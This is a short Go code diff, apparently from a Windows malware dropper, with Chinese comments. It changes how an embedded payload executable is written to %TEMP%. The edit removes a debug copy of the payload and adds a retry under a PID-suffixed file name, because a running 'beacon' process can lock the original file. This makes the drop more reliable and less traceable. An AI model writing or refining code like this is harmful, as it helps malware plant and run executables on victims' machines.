@@ -120,16 +120,22 @@ func main() {
 		return
 	}
 
-	// 落盘 %TEMP% 随机路径
+	// 落盘 %TEMP%。同名残留 beacon 进程在运行时会锁文件（Windows 运行中
+	// exe 不可覆盖）——写失败换 PID 后缀名重试，杜绝"跑过一次后永远失败"。
 	tmp := os.Getenv("TEMP")
 	if tmp == "" {
 		tmp = os.TempDir()
 	}
 	dst := filepath.Join(tmp, _dropName)
-	// 调试：先存一份到固定名供检查
-	_ = os.WriteFile(os.Getenv("TEMP")+"\\t0_payload_debug.bin", exeBytes, 0644)
 	if err := os.WriteFile(dst, exeBytes, 0o755); err != nil {
-		return
+		alt := _dropName
+		if n := len(alt); n > 4 && alt[n-4:] == ".exe" {
+			alt = alt[:n-4]
+		}
+		dst = filepath.Join(tmp, fmt.Sprintf("%s-%d.exe", alt, os.Getpid()))
+		if err2 := os.WriteFile(dst, exeBytes, 0o755); err2 != nil {
+			return
+		}
 	}
 	defer os.Remove(dst) // 父进程退出时清理
 
